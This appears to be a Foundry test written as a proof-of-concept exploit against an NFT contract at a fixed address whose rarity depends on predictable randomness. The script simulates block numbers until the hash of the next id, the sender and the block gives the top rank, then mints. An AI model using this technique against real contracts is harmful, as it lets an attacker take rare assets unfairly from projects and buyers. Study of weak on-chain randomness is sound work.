// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

interface INFT {
    function mint() external payable;
    function tokens(uint256 _id) external view returns (uint256);
    function id() external view returns (uint256);
}

contract PredictableNFTTest is Test {
	INFT nft;

	address hacker = address(0x1234);

	function setUp() public {
        vm.createSelectFork(vm.envString("INFURA"));
		vm.deal(hacker, 1 ether);
		nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);
		uint mintedId;
		uint currentBlockNum = block.number;

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum); // Set up block.number

			// ---- hacking time ----
            mintedId = nft.id();
            bytes32 computedHash = keccak256(abi.encode(++mintedId, address(hacker), block.number));
            if (uint256(computedHash) % 100 > 90) {
                console.log("Found! NFT with ID", i, "is Superior!");
                nft.mint{value: 1 ether}();
                break;
            }

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = address(nft).call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}